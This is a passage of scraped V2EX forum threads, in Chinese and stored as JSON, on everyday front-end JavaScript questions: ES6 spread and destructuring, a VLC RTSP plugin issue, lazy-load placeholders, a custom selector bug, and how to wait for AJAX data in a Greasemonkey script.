href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=let%20values%20=%20%5B1,%202,%204%5D;%0AdoSomething%28...values%29;%0Afunction%20doSomething%28x,%20y,%20z%29%20%7B%0A%20%20%20%20console.log%28arguments%29;%0A%7D%0A\">Run this code</a></p>\n\n<p>正如你所看到的，这也将我们从平常使用的 fn.apply （）应变方法中拯救出来。这个句法是非常灵活的，因为展开操作符可以在参数列表中任意使用。这就意味着，下面的调用会产生同样的结果：</p>\n<div class=\"highlight\"><pre>let values = [2, 4];\ndoSomething(1, ...values);\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=let%20values%20=%20%5B2,%204%5D;%0AdoSomething%281,%20...values%29;%0Afunction%20doSomething%28x,%20y,%20z%29%20%7B%0A%20%20%20%20console.log%28arguments%29;%0A%7D\">Run this code</a></p>\n\n<p>我们一直将展开操作符应用于数组和参数中。事实上，它可以被应用于所有的可迭代对象中，比如 NodeList:</p>\n<div class=\"highlight\"><pre>let form = document.querySelector('#my-form'),\n   inputs = form.querySelectorAll('input'),\n   selects = form.querySelectorAll('select');\n\nlet allTheThings = [form, ...inputs, ...selects];\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://jsbin.com/vibaxerino/edit?html,js,console\">Run this code</a></p>\n\n<p>现在 allTheThings 是一个包括 form 节点以及它的 input 还有 select 子节点的平面阵列。</p>\n\n<h1>解构</h1>\n\n<p>解构为从目标或数组中提取数据提供了便利。对于初学者来说，这里可以用数组给出一个很好的例子：</p>\n<div class=\"highlight\"><pre>let [x, y] = [1, 2]; // x = 1, y = 2\n\n// ES5 equivalent:\nvar arr = [1, 2];\nvar x = arr[0];\nvar y = arr[1];\n</pre></div>\n\n<p>有了这个句法，可以给多个变量一次性分配一个值。还有一个很好的附加效果，你可以很容易的交换变量值：</p>\n<div class=\"highlight\"><pre>let x = 1,\n    y = 2;\n\n\n[x, y] = [y, x]; // x = 2, y = 1\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=let%20x%20=%201,%0A%20%20%20%20y%20=%202;%0A%0A%5Bx,%20y%5D%20=%20%5By,%20x%5D;%0A\">Run this code</a></p>\n\n<p>解构也和目标兼容，要确保有匹配按键。</p>\n<div class=\"highlight\"><pre>let obj = {x: 1, y: 2};\nlet {x, y} = obj; // x = 1, y = 2\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=let%20obj%20=%20%7Bx:%201,%20y:%202%7D;%0Alet%20%7Bx,%20y%7D%20=%20obj;\">Run this code</a></p>\n\n<p>你也可以用这个方法来改变变量的名称：</p>\n<div class=\"highlight\"><pre>let obj = {x: 1, y: 2};\nlet {x: a, y: b} = obj; // a = 1, b = 2\n</pre></div>\n\n<p>还有一个有趣的模式是模拟多个返回值：</p>\n<div class=\"highlight\"><pre>function doSomething() {\n   return [1, 2]\n}\n\nlet [x, y] = doSomething(); // x = 1, y = 2\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=true&amp;spec=false&amp;code=function%20doSomething%28%29%20%7B%0A%20%20%20%20return%20%5B1,%202%5D%0A%7D%0A%0Alet%20%5Bx,%20y%5D%20=%20doSomething%28%29;\">Run this code</a></p>\n\n<p>解构也可以用来将默认值指定到参数目标中。通过一个对象字面值，你也可以模拟命名参数。</p>\n<div class=\"highlight\"><pre>function doSomething({y = 1, z = 0}) {\n   console.log(y, z);\n}\ndoSomething({y: 2});\n</pre></div>\n\n<p>此文为译文，如有问题请加 QQ 群 105454604 联系群主</p>\n</div></div>"], "reply": "1", "tittle": "ECMAScript 6（ ES6）有什么新东西（三）", "comment": ["H6 要到来的节奏吗"]},
{"content": ["<div class=\"topic_content\">各位 V 友晚上好，第一次在 V 站发求助帖，姿势不对请见谅。。\r<br>\r<br>这个问题是这样的，需求是在浏览器端播放由 IP 摄像头提供的 RTSP 视频流（表述可能不是很专业），目前采用的方案是用 VLC 播放器的浏览器插件（ VLC browser plugin ）。默认的传输视频的协议是 UDP 。受限于网络环境，视频总是花屏（ UDP 不可靠连接），于是决定用 TCP 的方式来传输视频。根据 VLC 的官方文档（\r<br>  <a target=\"_blank\" href=\"https://wiki.videolan.org/Documentation:WebPlugin/\" rel=\"nofollow\">https://wiki.videolan.org/Documentation:WebPlugin/</a>\r<br>）做了修改：\r<br>\r<br>\r<br>HTML 的部分是用的&lt;object id=\"vlc\"&gt;标签\r<br>\r<br>JavaScript 部分：\r<br>\r<br>var vlc = document.getElementById(\"id\");\r<br>\r<br>var options = new Array(\"--rtsp-tcp\");\r<br>var id = vlc.playlist.add(\"rtsp://192.168.#$%^&amp;此处是地址，记不清了，代码在公司\", \"fancy name\", options);\r<br>vlc.playlist.playItem(id);\r<br>\r<br>然而貌似没有起到什么作用，视频依旧花屏，抓包发现传输的协议仍然是 UDP 。\r<br>\r<br>Google 了这个问题，并没有什么收获。就好像没人遇见过这个问题一样。。。 stackoverflow 上倒是有位朋友问 vlc.playlist 里没内容的问题（我用 console.log 把 vlc.playlist 打出来，发现确实是 Object{}），底下唯一的一个答案说这是 VLC web plugin 的 bug ，然后推荐了另一个开源插件（ fbvlc ，不过这个插件文档写的不是很清楚）。。。\r<br>\r<br>有之前踩过这个坑的前辈么。。求各位指点。。谢谢大家。。</div>", "<div class=\"topic_content\">这个问题解决了。。我们自己开发了一个视频插件。。</div>"], "reply": "5", "tittle": "有一个 VLC 浏览器插件用 TCP 协议播放视频的问题（内详），求指点", "comment": ["1. 直接用 vlc 客户端打开这个 RTSP 流会卡顿吗？\r", "2. 就算确实是因为 UDP 不可靠连接的问题，你确定换成 TCP 就一定能解决问题？如果花屏是因为 UDP 丢包多，那么说明网络状况不好，用 TCP 的话重传机制会加重网络的拥塞。", " 多谢回复。\r", "1 ，直接用 vlc 客户端打开能正常播放，不花屏，不卡顿；\r", "2 ，是，这个问题我考虑过，编解码方面也在排查问题。这个玩意是好几个人一起开发的，前端方面（我负责的部分）好像只能做到这些。", "我们也是 vlc 插件播 udp 的 rtsp ，不花瓶呀\r", "\r", "检查下网络吧", "劣质的路由器交换机也会有问题。。。", " 嗯，是的。网络问题已经超出我的能力范围了。我们的业务是 to B 的，网络的问题周一给甲方反馈一下吧……现在的问题是 tcp 总是设置失败…"]},
{"content": ["<div class=\"topic_content\">自己做一个页面时遇到的一个问题。\r<br>需求是页面中有一个 select 元素，改变选项时跳转到对应的页面。\r<br>实现方法是在  onchange 上用 window.location 来控制。\r<br>但是在测试的时候发现一个问题：一个页面上默认选中的是 A ，选择 B 跳转到另一个页面后再点浏览器上的后退回来，由于之前选择过了 B ，这个时候看到的选中的选项还是 B 。现在用的一个这种的方案是跳转之前先把选项改成 A ，不过感觉应该有更好的解决方法？</div>"], "reply": "2", "tittle": "浏览器是如何在历史记录中记住每个页面的状态的？", "comment": ["no-cache", "window.history\r", "印象中是这个"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题。因为目前使用 lazyload 的 js 插件都是占位图固定尺寸的，如果占位图与需要加载的图片尺寸差别很大的话， 会出现页面的内容跳动。目前微信公众号的文章就解决的很好，占位图都是灰色的，但是尺寸与要加载的实际图片尺寸一致，加载出来的效果比较平滑。目前，可以想到的一个方法是让前端提供当前设备的浏览器宽度，然后计算高度。感觉还是不太靠谱。大家有没有更好的思路。多谢。</p>\n</div></div>"], "reply": "14", "tittle": "图片的延迟加载 lazyload 的占位图都是固定大小的，怎么让占位图与要加载的实际图片尺寸一致", "comment": ["首先你得知道图片显示的宽高", "我这边目前也是使用让接口返回宽和高，然后加载占位图的，应该没有其它的办法了吧", "固定高度计算宽带更合理。", "让服务器给你返回", "AMP ", "其实需要知道的并不是图片的宽高，而是需要知道图片的宽高比，设计 api 的时候需要多带一个参数返回前端", "移动端需要知道高宽比，根据宽算出高来。", "可你尝试固定宽度 比如就 100PX 这样的  毕竟手机基本上就是一张图一行", "如果图片是个正方形，可以用个 1px 的 base64 自动填充了", "有一种图片叫渐进 jpg ，还有一种叫交错 png/gif", "我倒是有种想法不知道可行性，请大家给予批评。\r", "\r", "存图片的时候把宽高写入文件名，前端正则出宽高然后占位。", "提前把图像大小写到 HTML 内敛样式中，前提是页面由后端渲染，并且数据库里保存了图像大小", "之前有想过这个问题，主要是避免加载的抖动，我感觉可以这样\r", "\r", "开始 URL 都已经传到前端，可以通过#w=1000#h=900 获取数据来设置占位大小（根据固定宽度或高度），动态加载图片时就不会出现抖动\r", "\r", "不过需要后端服务器的支持，保存和处理返回的 URL 附带这些参数\r", "\r", "知乎跳转到对应答案和评论就是这样实现的\r", "忽然想到，如果使用第三方服务器也可以，第三方是支持获取指定图片的信息的，可以自己请求后添加到 URL 尾部，前端就可以使用了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>把以下代码贴到 Chrome console 里面就可以了，浏览各种网站的时候总希望能有个排序功能可以选</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">len</span><span class=\"o\">=</span><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#Main .box .item\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">;</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">box</span><span class=\"o\">=</span><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#Main .box:first\"</span><span class=\"p\">);</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">a</span><span class=\"p\">,</span><span class=\"nx\">b</span><span class=\"p\">;</span>\n    <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span><span class=\"o\">=</span><span class=\"nx\">len</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"nx\">i</span><span class=\"o\">&gt;</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"nx\">i</span><span class=\"o\">--</span><span class=\"p\">){</span>\n        <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">j</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"nx\">j</span><span class=\"o\">&lt;</span><span class=\"nx\">i</span><span class=\"p\">;</span><span class=\"nx\">j</span><span class=\"o\">++</span><span class=\"p\">){</span>\n            <span class=\"nx\">a</span><span class=\"o\">=</span><span class=\"nx\">box</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">(</span><span class=\"s2\">\".item:eq(\"</span><span class=\"o\">+</span><span class=\"nx\">j</span><span class=\"o\">+</span><span class=\"s2\">\")\"</span><span class=\"p\">);</span>\n            <span class=\"nx\">b</span><span class=\"o\">=</span><span class=\"nx\">box</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">(</span><span class=\"s2\">\".item:eq(\"</span><span class=\"o\">+</span><span class=\"p\">(</span><span class=\"nx\">j</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"s2\">\")\"</span><span class=\"p\">);</span>\n            <span class=\"nx\">an</span><span class=\"o\">=</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">(</span><span class=\"s2\">\".count_livid\"</span><span class=\"p\">).</span><span class=\"nx\">text</span><span class=\"p\">()</span><span class=\"o\">-</span><span class=\"s2\">\"0\"</span><span class=\"p\">;</span>\n            <span class=\"nx\">bn</span><span class=\"o\">=</span><span class=\"nx\">b</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">(</span><span class=\"s2\">\".count_livid\"</span><span class=\"p\">).</span><span class=\"nx\">text</span><span class=\"p\">()</span><span class=\"o\">-</span><span class=\"s2\">\"0\"</span><span class=\"p\">;</span>\n            <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">an</span><span class=\"o\">&lt;</span><span class=\"nx\">bn</span><span class=\"p\">)</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">insertAfter</span><span class=\"p\">(</span><span class=\"nx\">b</span><span class=\"p\">);</span>\n        <span class=\"p\">}</span>   \n    <span class=\"p\">}</span>\n</pre></div>\n</div></div>"], "reply": "目前尚无回", "tittle": "一段小代码，对 V 站当前页面的文章按照回复数降序排列", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img src=\"https://ooo.0o0.ooo/2015/11/10/5641bec35546a.png\" alt=\"屏幕快照_2015-11-10_17_40_59.png\"></p>\n\n<p>在 chrome 控制台执行 <code>$('#main [class=github]')</code> 就会重现问题，检查之后发现是上图里的问题</p>\n\n<p>JS Code</p>\n<div class=\"highlight\"><pre>function $(selector) {\n    var str = selector.split(' '),\n        temp,\n        element = document;\n    console.log(str[0]);\n    for (var i = 0; i &lt; str.length; i++) {//ID\n        if (str[i].indexOf('#') === 0) {\n            temp = str[i].replace('#', '');\n            element = element.getElementById(temp);\n        }\n        else if (str[i].indexOf('.') === 0) {//Class\n            temp = str[i].replace('.', '');\n            element = element.getElementsByClassName(temp)[0];\n        }\n        else if (str[i].indexOf('#') === -1 &amp;&amp; str[i].indexOf('.') === -1 &amp;&amp; str[i].indexOf('[') === -1) {//Tag\n            element = element.getElementsByTagName(str[i])[0];\n        }\n        else if (str[i].indexOf('[') === 0 &amp;&amp; str[i].indexOf('=') === -1) {//属性\n            temp = str[i].replace('[', '').replace(']', '');\n            //console.log(temp)\n            //console.log(element.length,element)\n            //console.log(doc.length)\n            for (var element = element.getElementsByTagName('*'), j = 0; j &lt; element.length; j++) {\n                if (element[j].hasAttribute(temp) === true) {\n                    element = element[j];\n                }\n            }\n        }\n        else {//属性值\n            temp = str[i].replace('[', '').replace(']', '');\n            temp = temp.split('=');\n            element = element.getElementsByTagName('*');\n            for (var j = 0, l = element.length - 1; j &lt; l; j++) {\n                console.log('j=' + j, 'element.length=' + l);\n                if (element[j].attributes.length != 0) {\n                    //var xxx = element[j].attributes.length - 1;\n                    console.log('j=' + j);\n                    //for (var i = 0; i &lt; xxx; i++) {\n                    console.log('j=' + j);\n                    if (console.log(j) &amp;&amp; [j].attributes[temp[0]] != undefined &amp;&amp; element[j].attributes[temp[0]].value === temp[1]) {\n                        console.log('j=' + j);\n                        element = element[j];\n                    }\n                    //}\n                }\n\n            }\n        }\n    }\n    return element;\n}\n</pre></div>\n\n<p>HTML Code</p>\n<div class=\"highlight\"><pre>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div id=\"main\" class=\"main2\"&gt;\n    &lt;h1 id=\"tit\" class=\"title\"&gt;JavaScript&lt;/h1&gt;\n&lt;!--comment--&gt;\n    &lt;p class=\"test test1 test2\"&gt;\n        &lt;span&gt;\n            &lt;a href=\"baidu.com\" class=\"baidu\"&gt;&lt;/a&gt;\n            &lt;a href=\"github.com\" class=\"github\"&gt;&lt;/a&gt;\n        &lt;/span&gt;\n    &lt;/p&gt;\n&lt;/div&gt;\n&lt;div id=\"main2\"&gt;\n        &lt;span&gt;\n            &lt;a href=\"baidu.com\" class=\"baidu\"&gt;WEB&lt;/a&gt;\n            &lt;a href=\"github.com\" class=\"github\"&gt;web&lt;/a&gt;\n        &lt;/span&gt;\n&lt;/div&gt;\n&lt;ol&gt;&lt;/ol&gt;\n&lt;script src=\"util.js\"&gt;&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</pre></div>\n</div></div>"], "reply": "11", "tittle": "遇到一个关于 JavaScript 的 for 循环问题", "comment": ["没细看,说错了当我没说\r", "难道不是 j=4,l=4 的时候中止循环    \r", "所以 j=3 还在执行 j=4 不执行有错?", "在 chrome 控制台执行 $('#main [class=github]') 后正确结果应该是返回\r", "<a href=\"baidu.com\" class=\"baidu\"></a>", "没错啊，你自己这么写的", " 在 chrome 控制台查看日志 j 就没有循环到 4 ，到 3 就停止了", "```\r", "function $(selector) {\r", "    var str = selector.split(' '),\r", "        temp,\r", "        element = document;\r", "    console.log(str[0]);\r", "    for (var i = 0; i < str.length; i++) {//ID\r", "        if (str[i].indexOf('#') === 0) {\r", "            temp = str[i].replace('#', '');\r", "            element = element.getElementById(temp);\r", "        }\r", "        else if (str[i].indexOf('.') === 0) {//Class\r", "            temp = str[i].replace('.', '');\r", "            element = element.getElementsByClassName(temp)[0];\r", "        }\r", "        else if (str[i].indexOf('#') === -1 && str[i].indexOf('.') === -1 && str[i].indexOf('[') === -1) {//Tag\r", "            element = element.getElementsByTagName(str[i])[0];\r", "        }\r", "        else if (str[i].indexOf('[') === 0 && str[i].indexOf('=') === -1) {//属性\r", "            temp = str[i].replace('[', '').replace(']', '');\r", "            //console.log(temp)\r", "            //console.log(element.length,element)\r", "            //console.log(doc.length)\r", "            for (var element = element.getElementsByTagName('*'), j = 0; j < element.length; j++) {\r", "                if (element[j].hasAttribute(temp) === true) {\r", "                    element = element[j];\r", "                }\r", "            }\r", "        }\r", "        else {//属性值\r", "            temp = str[i].replace('[', '').replace(']', '');\r", "            temp = temp.split('=');\r", "            element = element.getElementsByTagName('*');\r", "            for (var j = 0, l = element.length - 1; j < l; j++) {\r", "                console.log('j=' + j, 'element.length=' + l);\r", "                if (element[j].attributes.length != 0) {\r", "                    //var xxx = element[j].attributes.length - 1;\r", "                    console.log('j=' + j);\r", "                    //for (var i = 0; i < xxx; i++) {\r", "                    console.log('j=' + j);\r", "                    if (element[j].attributes[temp[0]] != undefined && element[j].attributes[temp[0]].value === temp[1]) {\r", "                        console.log('j=' + j);\r", "                        element = element[j];\r", "                    }\r", "                    //}\r", "                }\r", "\r", "            }\r", "        }\r", "    }\r", "    return element;\r", "}\r", "```", " 循环条件是 j < l ， l = 4 的时候 j 是 0 1 2 3 ，你要是遍历全部节点的话 l 不用-1", "没理解，从 0 循环到 3 不就是四次吗", " Thanks", "理解一下 for 循环你就会明白为什么了 for 循环是倒着来的 从后往前判断 你 j=3 了 再来的话先执行 j++ 此时 j = 4 4< 4 吗？ 所以就停止了", " 蒙住了，多谢", "下标从零开始~~~"]},
{"content": ["<div class=\"topic_content\">最近在学 js ，拿几个网站写 grease m onkey 脚本练手，发现一个问题是有些网站的数据并不是直接在 html 中呈现的，而是通过 js 加载的，也许这就是所谓的 ajax 吧。\r<br>\r<br>现在问题是，如果我要用自己的脚本处理这部分数据，就必须保证这些数据被网站自己的脚本加载成功了才行，否则我的脚本是看不到这些数据的。\r<br>\r<br>因为 ajax 很多都是异步加载的，所以就算是把函数绑定到 windows. onload 方法上也不一定能保证脚本加载完了数据，现在的方法只能是用 setTimeOut 做个固定延时，但体验不太好，而且不是稳妥的做法。\r<br>\r<br>我希望的做法是用一个 while 循环检查页面内容是否加载成功，这个循环中，如果没有检测到内容，就让 js 脚本睡眠，类似 rtos 中线程主动释放 cpu 控制权一样。否则的话，这个循环就是个一直占用大量 CPU 资源的恶性循环，很容易让浏览器假死。\r<br>\r<br>不过找了一圈好像没有看到这样的函数，我总不能为了实现个 sleep ，自己在 javascript 上写一套类 rtos 调度系统出来吧。我本来想用一堆10~100毫秒的setTimeOut来实现，结果发现这好像还是会让浏览器假死，似乎setTimeout并没有释放CPU资源。</div>", "<div class=\"topic_content\">我觉得我大概了解 setTimeOut 如何工作了，不知道对不对：\r<br>\r<br>setTimeOut 这就是个定时器，定时 X 毫秒后执行某个函数。\r<br>\r<br>但这个函数本身是非 block 的，也就是说我如果把它放在 while 循环中的话，理论上是可以无限执行的，执行这个函数本身并不消耗时间，它就是个一次性调度器。\r<br>\r<br>这样就可以解释我在 While 中调用 setTimeOut 为什么会占用大量 CPU 资源了，因为对 CPU 来说 setTimeOut 和其他语句是一样的，这依然是个 CPU 跑满的恶性循环。</div>", "<div class=\"topic_content\">参考我 14 楼的代码，相当于这个 while 循环里，脚本在一直 SetTimeOut ，一直定时执行某个函数，这 100 毫秒内 CPU 根本停不下来；\r<br>而等到 100 毫秒的时候，实现 SetTimeOut 的函数就开始执行了，这里，嗯，估计有几万个函数在等待执行，不死才怪。</div>", "<div class=\"topic_content\">搞定了，用 setInterval 就行了：\r<br>\r<br>window. onload = my_bug\r<br>\r<br>\r<br>function my_bug() {\r<br>    console.log(\"OK!\")\r<br>    task = setInterval(check_data, 100)\r<br>    function check_data() {\r<br>        links = document.getElementsByTagName(\"a\")\r<br>        if (links.length &gt;= 10) {\r<br>            clearInterval(task)\r<br>            for (var i = 0; i &lt; links.length; i++) {\r<br>                orig_link = links[i].getAttribute('href')\r<br>                clean_link = orig_link.split(\"=\")[3]\r<br>                console.log(clean_link)\r<br>                links[i].setAttribute('href', clean_link)\r<br>            }\r<br>        }\r<br>        else\r<br>        {\r<br>            console.log(\"Checking...\")\r<br>        }\r<br>    }\r<br>}</div>"], "reply": "38", "tittle": "javascript 脚本如何进行“等待/sleep()”?", "comment": [".done()", "学 javascript ，心里必须有“回调函数”的概念。\r", "比如你进行的 ajax 操作，需要等待服务端返回包再处理数据。\r", "那你应该把处理数据的代码放在 ajax 的回调函数里，而不是像其他同步语言一样写在 ajax 代码后一行。", " 请问这是 jQuery 里的函数吗？有没有纯 js 的实现？", " 我写的是 grease monkey 脚本，和网站服务器是独立的两个部分，网站的 ajax 操作，怎么能设置我的函数作为回调呢？\r", "BTW ，抛开回调的概念，难道就没有这种方法吗？因为交出 cpu 控制权做一个简单的 sleep ，这几乎在所有语言里都有，就算在 C 里也很容易实现。", " JS 你还想让它交出 CPU 控制权，你想让浏览器 block 么", "js 是 non-blocking 是单线程的，如果你 sleep 了 那全部都会 block 住。。。", " 浏览器如果有这个 sleep 应该会把界面卡住吧，所以没发现可以这样。可以用一下 es6 的生成器，可以暂停 /重新 执行函数。", "你光用 setTimeOut 怎么可能让浏览器假死", "之前某墙攻击 github 的方法也是 setTimeout 来实现的，从没有人说那段循环加载导致引用那段 js 的网页死掉啊。 ", "\r", "恐怕你在 setTimeout 引的 function 里做了太多耗时的计算工作了，你可以用 settimeout 来循环检查是某资源否加载完毕，确定加载完毕后再去做其他耗时的计算工作。", "xmhttp.onreadystatechange = function(){\r", "\r", "}", "我字还没打完怎么就发出去了\r", "XMLHttp.onreadystatechange = function(){\r", "    if(XMLHttp.readyState==4 && XMLHttp.status==200){\r", "        //这里填完成数据加载后执行的内容\r", "    }\r", "};", "你是不是在 while 里面 setTimeout 了……你在函数的最后 setTimeout 这个函数自己。\r", "或者不用 while 循环用 setInterval", "js 是单线程，但是可以是异步的。像 AJAX 就是典型的异步执行", " \r", "\r", "while(True)\r", "{\r", "if(check_something()==False)\r", "{\r", "setTimeOut(nop_function,100)\r", "}\r", "}\r", "\r", "\r", "执行到这段明显卡住了，我希望的是 check_something 为 false 之后就 sleep 100 毫秒，这样占用的 CPU 时间顶多是有限次的 check_something()函数的执行时间，但实际看来并不是这样。", " 我就是做了个很简单的 a=2,if(a==1) alert('something')，基本上只有一个赋值和一个判断命令会被使用，我就把这段话当 nop 用了。", " JS 里应该没有 sleep 这样的东西", "alert 会阻塞", " 是的，我不是很清楚 setTimeOut 的工作方式，我以为这个函数可以实现非 block 的 sleep", " 不是这样， setTimeout 是立即返回，并且在调度队列里面加上一个 n 毫秒后的任务，所以相当于你这个在不停地执行，并且不停地往调度队列里面添加新的任务。你的这个需求可以考虑用 setInterval ，并在函数体里面判断条件是不是满足，不满足就直接返回，满足再执行里面的逻辑。", " 对，我刚刚想明白这点，这样可以解释为什么 while 会卡死了， setTimeOut 对 CPU 来说和其他语句是一样的。我确实该试试 setInterval ，谢谢！", " 不是这个问题，因为 alert 是绝对不会被执行的，问题出在 setTimeOut 是非阻塞的。", "var t;\r", "t = setInterval(function(){\r", "    if(check_something() == true) {\r", "        clearInterval(t);\r", "        // your funcs\r", "    }\r", "}, 1000);\r", "\r", "\r", "大概这样。", " 建议你花个一天时间读读《 JavaScript The Definitive Guide 》，尤其是第 17 章 Handling Events 。浏览器端 JS 的事件驱动编程模型和一般的 C 语言程序有很大不同，我自己一开始也似懂非懂一知半解。与其针对一个具体例子分析来分析去，不如踏踏实实从头学习来的快。", "额，你感到浏览器假死是因为 while （ true ）生成了 n 多个 setTimeout,这个锅不能 setTimeout 来背.\r", "\r", "用 settimeout 做定时器要这么写\r", "function fn() {\r", "  if (check_something()===false) {\r", "    timer = setTimeout(fn, 100);\r", "  }\r", "  else {\r", "    //TODO\r", "  }\r", "}\r", "var timer = setTimeout(fn, 100);", " 谢谢建议。\r", "\r", "其实我自己用 C 写过简单的 RTOS ，所以调度系统对我来说是没什么难度的，用 RTOS 的思想做支撑，这些东西其实很容易理解，有点像练武的人打通任督二脉:)\r", "\r", "我今天这个问题主要是没先检查 setTimeOut 函数是不是阻塞的，现在已经搞定了。", " 对的，我改用 setInterval 就好了。", "用 while 循环不就阻塞了整个 JavaScript 线程么，本来就是单线程，你这么一搞别的 js 代码都无法执行了。用定时器也不是什么好办法，频率高的话一样很影响性能。应该会有一些比较 hack 的方法可以解决你的问题，但是我觉得这种操作太敏感了吧，直接捕捉别人网站的数据？", "很明显，以楼主目前的水平，很难跟他解释清楚。", " 只是过滤掉我不想要的内容", " 我用定时器坐下来效果很好了，因为本身操作量就很小。", "建议题主还是看一下 23 楼推荐的内容，这和 RTOS 并不同，并不是多线程多任务的问题。\r", "你现在的方式的确可以达到效果，但消耗了很多浏览器资源，而且不够优雅，并不是 js 这个语言通用的解决方案。", " 谢谢，我会去看的。", "永远不要在 JS 实现 Sleep", "在 js 中用循环和模拟 sleep 的方式判断是否加载完成是十分不对的， js 由于其特性与使用场景所需要的编程思想与 c 等非脚本语言是不太一样的。", "lz 题目中描述的需求实际上是不需要任何 setTimeout 和 setInvertal 的，所要做的只是让这些 ajax 请求加载完成后来主动执行需要的操作。 23 楼的内容应该会有不少帮助~", " 啊抱歉没看清楚前提_(:3 」∠)_\r", "如果是 grease monkey 这种插入式脚本可以通过监听 DOMNodeInserted 事件来判断是否已处理完请求到数据\r", "不过我记得这个似乎可以在页面加载前就执行？也许可以直接复写浏览器的 XMLHttpRequest 来直接获取请求数据 XD", " 但这还有个问题，例如京东页面上的无货提示，就是 js 加载出来的，但并不是一定会有无货提示出现(碰上全有货的话)，这种情况下，是不是 DOMNodeInserted 事件就不一定发生了。", "用下老赵的 winjs", "其实我很想说等到 es6 的 yield 或者 es7 的 async 就好了……\r", "\r", "不过大家的回答好像都跟我想的不一样……\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h4>Principles of Meteor</h4>\n\n<p>Meteor 是一个实时 full stack JavaScript 框架。 Reactivity 是它的一个非常重要的特点。官网上列出了 Meteor 的 7 大原则或者说是特点:</p>\n\n<ul>\n<li><p><strong><em>Data on the Wire</em></strong>. Meteor 不发 HTML ，服务器端只负责发送数据，让客户端来渲染</p></li>\n<li><p><strong><em>One Language</em></strong>. 前后端都是 JavaScript 语言</p></li>\n<li><p><strong><em>Database Everywhere</em></strong>. 前后端都可以直接创建存取修改数据库里的数据，并且安全</p></li>\n<li><p><strong><em>Latency Compensation</em></strong>. Meteor 在前端提前获取数据并模拟数据模型，使其看起来像是从服务器端立即返回了数据</p></li>\n<li><p><strong><em>Full Stack Reactivity</em></strong>. 实时相应是 Meteor 的缺省配置。在所有层面，从数据库到模板，都会在必要时自动更新</p></li>\n<li><p><strong><em>Embrace the Ecosystem</em></strong>. Meteor 完全开源并集成了很多现有的开源工具和框架。例如 Angular ， React 。 Meteor 有自己的 AtmosphereJS 包下载管理应用，也可直接使用 NPM (目前是非官方支持)</p></li>\n<li><p><strong><em>Simplicity Equals Productivity</em></strong>. Meteor 简单易上手， API 简介优美</p></li>\n</ul>\n\n<h4>什么是响应式编程 (Reactive Programming)</h4>\n\n<p>可能还有人不理解什么是 Reactivity 。简单来说 Reactivity 就是数据传递的一种模式，特别是如何传递数据的变化。一种编程语言或者框架如果能够自动传递数据的变化，不需要用户再编写代码去更新使用到的变量，那么我们就说它是 reactive 的。</p>\n\n<p>比如 Meteor 和 facebook 的 React 框架就是这么处理数据变化的，不需要额外的代码。如果 reactive 的变量发生了变化，那么框架会自动再次运行使用到这个变量且具有 reactive 特性的代码段 - 这里引入了一个 reactive computation/context (程序的上下文，一般是一个函数) 概念。如果配合使用 React ， React 会自动在 virtual dom 上比较，然后只渲染更新了的那一小部分，而不是再把所有涉及到的无论变化与否的 view 都再渲染一次。这样不用自己再写代码来指定更新的地方，代码就更容易维护，前端的开发和运行效率都有提高。</p>\n\n<p>举个例子。<code>a = b + c</code>，如果 b 是 1 ， c 是 2 ，那么 a 的值就是 3 。在不是 reactive 的 函数里，如果 b 的值变为 4 ，什么事情都不会发生，你得自己动手去触发需要更新的地方；而在 reactive 的函数里， a 的值会自动变为 6 。凡是在  Template 里引用 a 的地方都会变为 6 ，而不再需要手动更新。就是 b 和 c 改变了，这个 reactive 函数会被自动调用，再次计算得出 a 的新值 6 。这样代码会少很多，逻辑也更简单，特别是涉及到需要再次渲染 view 的时候。</p>\n\n<p>最后注意，要具备 reactivity ，必须得满足两个条件。第一是要有一个 reactive 的数据源，第二就是这个数据源要在具有 reactive 特性的上下文里被使用。这样可以避免一些不必要的副作用，可以选择不用 